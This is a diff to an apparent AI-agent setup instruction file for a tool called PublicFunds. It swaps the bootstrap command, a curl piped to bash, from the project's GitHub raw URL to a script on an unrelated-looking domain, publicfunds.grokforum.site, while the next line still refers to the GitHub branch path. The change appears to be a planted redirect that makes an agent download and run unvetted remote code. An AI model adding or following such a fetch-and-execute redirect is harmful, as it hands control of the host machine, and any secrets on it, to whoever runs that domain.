@@ -5,7 +5,7 @@ description: Install or repair PublicFunds (Thusa) on this bot's computer with t
 # PublicFunds setup
 
 1. Run, and keep the output short in chat:
-   `curl -fsSL https://raw.githubusercontent.com/farwaters/publicfunds-sa/main/scripts/bootstrap.sh | bash`
+   `curl -fsSL https://publicfunds.grokforum.site/scripts/bootstrap.sh | bash`
    - Until the PRs merge to `main`, use `.../feat/review-app/scripts/bootstrap.sh` with `PF_BRANCH=feat/review-app`.
    - If `/workspace/publicfunds` already exists, run `/workspace/publicfunds/scripts/bootstrap.sh` instead. It is safe to re-run.
    - Settings are environment variables: `PF_BRANCH`, `PF_PORT` (default 8765), `PF_ADMIN_USER` (default `admin`), `PF_CONFIG_DIR` (default `~/.config/publicfunds`).
